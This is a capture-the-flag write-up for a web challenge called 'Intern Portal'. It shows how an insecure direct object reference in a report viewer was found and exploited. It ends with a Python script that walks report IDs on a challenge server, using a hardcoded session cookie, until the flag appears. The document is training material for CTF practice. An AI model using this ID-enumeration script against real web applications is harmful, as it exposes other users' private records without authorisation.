#### Intern Portal
- points earned: 752
#### Where's the flag?
- There's no source code with this challenge so the flag location is unknown.
#### Solution
- Investigating the app I see some functionality that allows user login and account creation.
- After creating an account I logged in and ended up at a dashboard.
	- The dashboard has a form that allows creation of a report with two fields.  A title field and a content field.
- I created a report with a junk title and content.  After clicking the `Create Report` button a link to the report was added to the `Your Reports` section.
- The link goes to `/report?id=14177`
- At this point I'm thinking IDOR so I begin to manually go through ids starting at 0.  I got to `/report?id=5` and got the result `Fake report #5 — Definitely too low`.
- Based on that result, I decided to code up a solution and found the flag hidden at the report with id `347`
```python
import requests

def doThing(n):

    url = f'http://23.179.17.92:5001/report?id={n}'
    session = 'eyJ1c2VyX2lkIjo0Nzd9.aeJ-Lg.zef5WPKpt-iO5hxwsi1LB2lBTu4'
    cookies = {
        'session': session
    }
    r = requests.get(url, cookies=cookies, allow_redirects=False)
    if r.status_code != 200:
        print(f'{r.status_code=}')
        print(f'{r.headers=}')
        print(f'{r.text=}')
        print(f'ERROR :(')
        exit()
    if 'CIT{' in r.text:
        print(f'{r.text=}')
        print(f'WIN???')
        exit()


for i in range(1, 4147):
    print(f'trying {i}...')
    doThing(i)
```